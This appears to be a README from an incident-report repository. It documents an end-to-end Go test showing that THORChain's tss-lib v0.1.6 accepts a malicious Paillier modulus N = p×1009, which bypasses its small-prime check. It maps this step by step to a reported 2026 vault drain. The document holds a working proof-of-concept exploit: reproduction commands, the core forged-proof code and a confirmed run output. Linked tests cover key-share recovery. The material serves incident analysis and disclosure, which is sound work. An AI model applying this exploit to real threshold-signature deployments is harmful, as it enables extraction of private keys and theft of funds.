# Real-lib attack — links against the actual vulnerable code

`attack_real_lib_test.go` is the **end-to-end** demonstration: it links
against `gitlab.com/thorchain/tss/tss-lib` at tag `v0.1.6` (the same
version THORChain runs in production) and shows that the lib's
`(*Proof).Verify(N, k, ecdsaPub)` returns **true** for a malicious
`N = p_big × 1009` (smallest small factor that bypasses the trial
division at `verifyPrimesUntil = 1000`).

Captured run output: [`run_output.txt`](./run_output.txt)

```
[6] calling proof.Verify (REAL vulnerable lib code)
[7] Verify returned: true
[8] === ATTACK CONFIRMED AGAINST REAL LIB v0.1.6 ===
--- PASS: TestMaliciousNAcceptedByRealLib (0.10s)
```

## Why this needs WSL / Linux

Pure Go, but the lib clone happens via `git clone` of an external repo
that is not part of this repository. Building third-party Go code is
sandbox-restricted on the Windows host; running it under WSL Ubuntu is
fine once `go mod` deps are downloaded.

## How to reproduce

```bash
# In WSL Ubuntu (or any Linux with Go 1.18+):

# 1. Clone the vulnerable lib
mkdir -p ~/tss-build && cd ~/tss-build
git clone --depth 1 --branch v0.1.6 \
    https://gitlab.com/thorchain/tss/tss-lib.git tss-lib-thorchain

# 2. The lib's go.mod declares go 1.22.2 (invalid format in older Go).
#    Downgrade to a value the toolchain accepts:
sed -i 's/go 1\.22\.2/go 1.18/' tss-lib-thorchain/go.mod

# 3. Set up the test module
mkdir -p ~/tss-attack && cd ~/tss-attack

cat > go.mod <<EOF
module tss_real_lib_attack
go 1.18
require (
    github.com/binance-chain/tss-lib v0.0.0
    github.com/btcsuite/btcd v0.22.0-beta
)
replace github.com/binance-chain/tss-lib => /root/tss-build/tss-lib-thorchain
replace github.com/agl/ed25519 => github.com/binance-chain/edwards25519 v0.0.0-20200305024217-f36fc4b53d43
EOF

# 4. Drop in the test file
cp /mnt/c/path/to/this/repo/incident_reports/2026-05-15_thorchain_secure_plus_drain/tss_demo/real_lib_run/attack_real_lib_test.go .

go mod tidy
go test -v -timeout 180s
```

Expected output matches `run_output.txt`.

## What the test does (12 lines that matter)

```go
// Build a malicious Paillier key the lib's keygen would never produce on its own:
// N = pBig × 1009, where 1009 ≥ verifyPrimesUntil = 1000 (bypasses Part A).
pBig, _ := rand.Prime(rand.Reader, 1014)
N := new(big.Int).Mul(pBig, big.NewInt(1009))
phiN := new(big.Int).Mul(new(big.Int).Sub(pBig, big.NewInt(1)), big.NewInt(1008))

// Generate a legitimate Goldwasser proof using the malicious factorization
// (attacker knows it).
M := new(big.Int).ModInverse(N, phiN)
xs := paillier.GenerateXs(13, k, N, ecdsaPub)
var proof paillier.Proof
for i := 0; i < 13; i++ { proof[i] = new(big.Int).Exp(xs[i], M, N) }

// THE TEST: hand the malicious N + valid proof to the LIB'S Verify.
ok, _ := proof.Verify(N, k, ecdsaPub)
// ok == true   ← bug confirmed against the real lib code
```

Note `N` must be a multiple of 256 bits because the lib's `GenerateXs`
generates 32-byte blocks and rejects samples ≥ N (rejection sampling).
1024 bits is the smallest size that works reliably for this lib; real
TSS uses 2048 bits.

## Sources of the bug

Linked via real file paths in the cloned lib (relative to the lib's
own checkout, not this repo):

- `crypto/paillier/paillier.go:35` — `verifyPrimesUntil = 1000` (the
  size of the small-prime trial-division window)
- `crypto/paillier/paillier.go:240-277` — `func (pf Proof) Verify`
  (the broken check)
- `ecdsa/keygen/round_4.go:42-51` — where `Verify` is called per peer
  during keygen round 4 (the only chance the protocol gets to reject
  a malicious modulus)

## Mapping to the 2026-05-15 incident

| Step | What the attacker did | What this test proves |
|---|---|---|
| 1 | Joined active set on 2026-05-12 (3 days before attack) | n/a |
| 2 | Participated in keygen ceremony of new Asgard vault | n/a |
| 3 | Broadcast a malicious Paillier N during keygen | **This test exhibits the same malicious construction** |
| 4 | Honest peers ran `proof.Verify(maliciousN, …)` and **accepted** it | **This test shows the lib's `Verify` returns `true` for that N** |
| 5 | Honest peers encrypted their share contributions under the malicious N | (downstream of accepted N) |
| 6 | Attacker recovered shares mod q_small via partial Paillier decryption | Reproduced in [`../paillier_modulus_attack_test.go`](../paillier_modulus_attack_test.go) |
| 7 | CRT over ~16 sessions → full ECDSA share | Reproduced in [`../paillier_modulus_attack_test.go`](../paillier_modulus_attack_test.go) (24 sessions, 13-bit q's, 256-bit share recovered byte-for-byte) |
| 8 | Sign vault outbound directly with extracted private key | Reproduced in [`../equivocation_attack_test.go`](../equivocation_attack_test.go) test #4 (textbook ECDSA recovery) |
| 9 | $10.8M drained across BTC/ETH/BSC/Base/AVAX | rumored / team estimate |

Step 4 is the link that previously had to be argued from source code
reading. With this test, it is **executed** against the real lib.
